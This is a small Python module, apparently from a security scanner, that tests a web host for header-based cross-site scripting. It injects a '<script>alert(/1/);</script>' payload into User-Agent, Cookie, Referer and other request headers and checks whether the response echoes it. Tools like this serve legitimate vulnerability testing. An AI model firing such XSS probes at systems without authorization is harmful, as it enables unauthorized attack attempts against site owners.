#!/usr/bin/python
# -*- coding: utf-8 -*-
# Author: Pradeep Jairamani , github.com/pradeepjairamani

import requests

def header_xss(host, payloads_xss = None, headers_xss = None):
    '''
    Args:
        host: The Hostname to check
        payload_xss: XSS Payload
        header_xss : Headers for XSS
    Return
        Result : True or False
    '''
    if payloads_xss is None:
        payloads_xss = '<script>alert(/1/);</script>'
    if headers_xss is None:
        headers_xss = {
                'User-Agent': payloads_xss
                ,'Except': payloads_xss
                ,'Cookie': payloads_xss
                ,'Referer': payloads_xss
                ,'Accept-Encoding': payloads_xss
                ,'Accept-Language': payloads_xss
                ,'Accept': payloads_xss
                }
    try:
        r = requests.head(host)
        for header in r.headers:
            headers_xss[header] = payloads_xss
        req = requests.post(host, headers=headers_xss)
        if payloads_xss.lower() in req.text.lower():
            return True
        else:
            return False
    except Exception:
        return False
